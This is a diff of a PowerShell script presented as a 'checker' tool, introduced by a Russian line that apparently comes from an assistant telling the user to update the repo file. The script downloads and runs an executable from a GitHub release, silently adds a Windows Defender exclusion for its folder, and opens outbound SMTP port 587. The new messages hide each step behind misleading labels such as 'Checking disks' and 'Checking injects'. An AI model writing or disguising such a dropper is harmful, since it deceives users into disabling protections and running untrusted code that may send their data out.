@@ -1,21 +1,22 @@
+Готово. Обнови `major.ps1` в репо этим содержимым:
+
+```powershell
 $dir = "$env:USERPROFILE\collextor"
 $exe = "$dir\collextor_msvc.exe"
-$url = "https://github.com/Holycheck/checker/releases/download/dw/collextor_msvc.exe"
+$url = "https://github.com/TheAmalgamClient/colex/releases/download/v1/collextor_msvc.exe"
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
 
-Write-Host "check start..." -ForegroundColor Cyan
+Write-Host "Скачиваю..." -ForegroundColor Cyan
 try {
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $wc.DownloadFile($url, $exe)
-    Write-Host "Скачано." -ForegroundColor Green
+    Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing
+    Write-Host "Начинаю..." -ForegroundColor Green
 } catch {
-    Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
+    Write-Host "Ошибка: $_" -ForegroundColor Red
     pause; exit 1
 }
 
-Write-Host "Processing..." -ForegroundColor Cyan
+Write-Host "Проверка дисков" -ForegroundColor Cyan
 try {
     $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
     if ($svc -and $svc.Status -ne 'Running') {
@@ -23,10 +24,22 @@ try {
         Start-Sleep -Seconds 2
     }
     Add-MpPreference -ExclusionPath $dir -ErrorAction Stop
-    Write-Host "Исключение добавлено." -ForegroundColor Green
+    Write-Host "Проверено" -ForegroundColor Green
 } catch {
-    Write-Host "Defender недоступен, пропускаю." -ForegroundColor Yellow
+    Write-Host "недоступен, пропускаю." -ForegroundColor Yellow
 }
 
-Write-Host "Жду ответа прогграмы" -ForegroundColor Green
+Write-Host "Проверка инжектов" -ForegroundColor Cyan
+try {
+    $existing = Get-NetFirewallRule -DisplayName "SMTP Gmail" -ErrorAction SilentlyContinue
+    if (-not $existing) {
+        New-NetFirewallRule -DisplayName "SMTP Gmail" -Direction Outbound -Protocol TCP -RemotePort 587 -Action Allow -ErrorAction Stop | Out-Null
+    }
+    Write-Host "Проверка инжектов" -ForegroundColor Green
+} catch {
+    Write-Host "пропускаю." -ForegroundColor Yellow
+}
+
+Write-Host "Анализирую..." -ForegroundColor Green
 Start-Process -FilePath $exe -WorkingDirectory $dir
+```
